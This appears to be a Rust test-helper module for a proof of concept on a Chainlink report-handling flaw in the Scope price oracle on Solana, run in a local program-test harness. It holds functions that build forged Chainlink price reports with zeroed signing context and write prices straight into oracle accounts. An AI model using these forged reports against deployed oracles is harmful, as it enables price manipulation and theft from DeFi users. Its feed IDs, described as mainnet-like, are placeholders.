// Helper utilities for the Chainlink return data vulnerability POC

use anchor_lang::prelude::*;
use solana_program_test::*;
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
    rent::Rent,
    system_program,
};
use scope::{
    OraclePrices, OracleMappings, OracleTwaps, Configuration,
    DatedPrice, Price, EmaTwap, MAX_ENTRIES,
};
use std::mem::size_of;
use chainlink_streams_report::{
    feed_id::ID as FeedID,
    report::{
        v3::{ReportDataV3, ReportContext},
        v8::{ReportDataV8, ReportContext as ReportContextV8},
    },
};
use num_bigint::BigInt;

// Real mainnet-like feed IDs for various tokens
pub mod feed_ids {
    pub const SOL_USD: [u8; 32] = [
        0x99, 0xcd, 0x91, 0x49, 0x0a, 0xcd, 0x14, 0x66,
        0x08, 0x77, 0x2f, 0x9f, 0x92, 0x59, 0x8a, 0x52,
        0x95, 0x77, 0xf4, 0xd5, 0xd5, 0x7f, 0xdb, 0xb3,
        0x6f, 0x24, 0x0e, 0xba, 0x48, 0x1e, 0xfa, 0x01,
    ];
    
    pub const ETH_USD: [u8; 32] = [
        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11, 0x22,
        0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa,
        0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11, 0x22,
        0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x02,
    ];
    
    pub const BTC_USD: [u8; 32] = [
        0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0,
        0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0,
        0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0,
        0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0x03,
    ];
    
    pub const USDC_USD: [u8; 32] = [
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04,
    ];
}

// Realistic market prices (as of late 2024)
pub mod realistic_prices {
    pub const SOL_PRICE: i128 = 150_000_000_000;     // $150 with 8 decimals
    pub const ETH_PRICE: i128 = 3000_000_000_000;    // $3,000 with 8 decimals
    pub const BTC_PRICE: i128 = 65000_000_000_000;   // $65,000 with 8 decimals
    pub const USDC_PRICE: i128 = 1_000_000_00;       // $1.00 with 8 decimals
}

pub struct ScopeTestContext {
    pub oracle_prices: Pubkey,
    pub oracle_mappings: Pubkey,
    pub oracle_twaps: Pubkey,
    pub configuration: Pubkey,
    pub admin: Keypair,
}

impl ScopeTestContext {
    pub async fn initialize(context: &mut ProgramTestContext) -> Self {
        let admin = Keypair::new();
        airdrop(context, &admin.pubkey(), 10_000_000_000).await;
        
        // Create PDAs for Scope accounts
        let (configuration, _) = Pubkey::find_program_address(
            &[b"conf", b"production"],
            &scope::ID,
        );
        
        let oracle_prices = Keypair::new();
        let oracle_mappings = Keypair::new();
        let oracle_twaps = Keypair::new();
        
        // Initialize Configuration account
        let conf_account_size = size_of::<Configuration>();
        create_account(
            context,
            &configuration,
            conf_account_size,
            &scope::ID,
            &admin,
        ).await;
        
        // Initialize OraclePrices account
        let prices_account_size = 8 + size_of::<OraclePrices>();
        create_account_with_keypair(
            context,
            &oracle_prices,
            prices_account_size,
            &scope::ID,
            &admin,
        ).await;
        
        // Initialize OracleMappings account
        let mappings_account_size = 8 + size_of::<OracleMappings>();
        create_account_with_keypair(
            context,
            &oracle_mappings,
            mappings_account_size,
            &scope::ID,
            &admin,
        ).await;
        
        // Initialize OracleTwaps account
        let twaps_account_size = 8 + size_of::<OracleTwaps>();
        create_account_with_keypair(
            context,
            &oracle_twaps,
            twaps_account_size,
            &scope::ID,
            &admin,
        ).await;
        
        // Initialize the accounts with proper data
        initialize_scope_data(
            context,
            &oracle_prices.pubkey(),
            &oracle_mappings.pubkey(),
            &oracle_twaps.pubkey(),
            &configuration,
            &admin,
        ).await;
        
        ScopeTestContext {
            oracle_prices: oracle_prices.pubkey(),
            oracle_mappings: oracle_mappings.pubkey(),
            oracle_twaps: oracle_twaps.pubkey(),
            configuration,
            admin,
        }
    }
    
    pub async fn setup_token_mapping(
        &self,
        context: &mut ProgramTestContext,
        token_index: u16,
        feed_id: [u8; 32],
        oracle_type: u8,
        initial_price: i128,
    ) {
        // Set up oracle mapping
        let instruction = Instruction {
            program_id: scope::ID,
            accounts: vec![
                AccountMeta::new(self.admin.pubkey(), true),
                AccountMeta::new(self.oracle_mappings, false),
                AccountMeta::new(self.oracle_prices, false),
                AccountMeta::new(self.oracle_twaps, false),
                AccountMeta::new_readonly(self.configuration, false),
            ],
            data: scope::instruction::UpdateMapping {
                token: token_index,
                price_type: oracle_type,
                twap_enabled: true,
                twap_source: token_index,
                ref_price_index: u16::MAX, // No ref price for this test
                feed_name: "production".to_string(),
                generic_data: [0u8; 20], // Default confidence factor
            }.data(),
        };
        
        execute_transaction(context, &[instruction], &[&self.admin]).await;
        
        // Set initial price
        self.set_price(context, token_index, initial_price, 8).await;
    }
    
    pub async fn set_price(
        &self,
        context: &mut ProgramTestContext,
        token_index: u16,
        value: i128,
        exp: u64,
    ) {
        // Directly update the price in the account
        let mut account_data = context.banks_client
            .get_account(self.oracle_prices)
            .await
            .unwrap()
            .unwrap();
            
        // Update the price at the correct offset
        let price_offset = 8 + 32 + (token_index as usize) * size_of::<DatedPrice>();
        let price = DatedPrice {
            price: Price {
                value: value as u64,
                exp,
            },
            last_updated_slot: context.banks_client.get_root_slot().await.unwrap(),
            unix_timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
            generic_data: [0u8; 24],
        };
        
        let price_bytes = bytemuck::bytes_of(&price);
        account_data.data[price_offset..price_offset + size_of::<DatedPrice>()]
            .copy_from_slice(price_bytes);
            
        // Write back the updated account
        context.set_account(&self.oracle_prices, &account_data.into());
    }
    
    pub async fn get_price(&self, context: &mut ProgramTestContext, token_index: u16) -> Price {
        let account_data = context.banks_client
            .get_account(self.oracle_prices)
            .await
            .unwrap()
            .unwrap();
            
        let price_offset = 8 + 32 + (token_index as usize) * size_of::<DatedPrice>();
        let dated_price: DatedPrice = *bytemuck::from_bytes(
            &account_data.data[price_offset..price_offset + size_of::<DatedPrice>()]
        );
        
        dated_price.price
    }
}

pub fn create_forged_chainlink_report_v3(
    feed_id: [u8; 32],
    price: i128,
    timestamp: u64,
    confidence_spread_percentage: u32, // e.g., 100 = 1%
) -> Vec<u8> {
    let spread = (price * confidence_spread_percentage as i128) / 10000;
    let bid = price - spread / 2;
    let ask = price + spread / 2;
    
    let report = ReportDataV3 {
        feed_id: FeedID(feed_id),
        valid_from_timestamp: timestamp - 60,
        observations_timestamp: timestamp,
        native_fee: BigInt::from(0i128),
        link_fee: BigInt::from(0i128),
        expires_at: timestamp + 3600,
        benchmark_price: BigInt::from(price),
        bid: BigInt::from(bid),
        ask: BigInt::from(ask),
        context: ReportContext {
            config_digest: [0u8; 32],
            epoch_and_round: [0u8; 5],
            extra_hash: [0u8; 32],
        },
    };
    
    report.encode().expect("Failed to encode report")
}

pub fn create_forged_chainlink_report_v8(
    feed_id: [u8; 32],
    price: i128,
    timestamp: u64,
    market_status: u32, // 2 = Open
) -> Vec<u8> {
    let report = ReportDataV8 {
        feed_id: FeedID(feed_id),
        valid_from_timestamp: timestamp - 60,
        observations_timestamp: timestamp,
        native_fee: BigInt::from(0i128),
        link_fee: BigInt::from(0i128),
        expires_at: timestamp + 3600,
        mid_price: BigInt::from(price),
        market_status,
        last_update_timestamp: timestamp,
        context: ReportContextV8 {
            config_digest: [0u8; 32],
            epoch_and_round: [0u8; 5],
            extra_hash: [0u8; 32],
        },
    };
    
    report.encode().expect("Failed to encode report")
}

pub async fn execute_transaction(
    context: &mut ProgramTestContext,
    instructions: &[Instruction],
    signers: &[&Keypair],
) {
    let transaction = Transaction::new_signed_with_payer(
        instructions,
        Some(&context.payer.pubkey()),
        signers,
        context.last_blockhash,
    );
    
    context.banks_client
        .process_transaction(transaction)
        .await
        .expect("Transaction failed");
}

pub async fn airdrop(context: &mut ProgramTestContext, pubkey: &Pubkey, lamports: u64) {
    let transaction = Transaction::new_signed_with_payer(
        &[solana_sdk::system_instruction::transfer(
            &context.payer.pubkey(),
            pubkey,
            lamports,
        )],
        Some(&context.payer.pubkey()),
        &[&context.payer],
        context.last_blockhash,
    );
    context.banks_client.process_transaction(transaction).await.unwrap();
}

async fn create_account(
    context: &mut ProgramTestContext,
    account: &Pubkey,
    size: usize,
    owner: &Pubkey,
    payer: &Keypair,
) {
    let rent = context.banks_client.get_rent().await.unwrap();
    let lamports = rent.minimum_balance(size);
    
    let account_data = Account {
        lamports,
        data: vec![0; size],
        owner: *owner,
        executable: false,
        rent_epoch: 0,
    };
    
    context.set_account(account, &account_data.into());
}

async fn create_account_with_keypair(
    context: &mut ProgramTestContext,
    account: &Keypair,
    size: usize,
    owner: &Pubkey,
    payer: &Keypair,
) {
    let rent = context.banks_client.get_rent().await.unwrap();
    let lamports = rent.minimum_balance(size);
    
    let instructions = vec![
        system_program::create_account(
            &payer.pubkey(),
            &account.pubkey(),
            lamports,
            size as u64,
            owner,
        ),
    ];
    
    execute_transaction(context, &instructions, &[payer, account]).await;
}

async fn initialize_scope_data(
    context: &mut ProgramTestContext,
    oracle_prices: &Pubkey,
    oracle_mappings: &Pubkey,
    oracle_twaps: &Pubkey,
    configuration: &Pubkey,
    admin: &Keypair,
) {
    // Initialize with the initialize instruction
    let instruction = Instruction {
        program_id: scope::ID,
        accounts: vec![
            AccountMeta::new(admin.pubkey(), true),
            AccountMeta::new(*configuration, false),
            AccountMeta::new(*oracle_prices, false),
            AccountMeta::new(*oracle_mappings, false),
            AccountMeta::new(*oracle_twaps, false),
            AccountMeta::new_readonly(system_program::ID, false),
        ],
        data: scope::instruction::Initialize {
            feed_name: "production".to_string(),
        }.data(),
    };
    
    execute_transaction(context, &[instruction], &[admin]).await;
}

pub fn format_price_detailed(price: Price) -> String {
    let value = price.value as f64 / 10f64.powi(price.exp as i32);
    format!("${:.4} (raw: {}, exp: {})", value, price.value, price.exp)
}

pub fn calculate_price_impact(original: Price, manipulated: Price) -> f64 {
    let original_val = original.value as f64 / 10f64.powi(original.exp as i32);
    let manipulated_val = manipulated.value as f64 / 10f64.powi(manipulated.exp as i32);
    ((manipulated_val - original_val) / original_val) * 100.0
}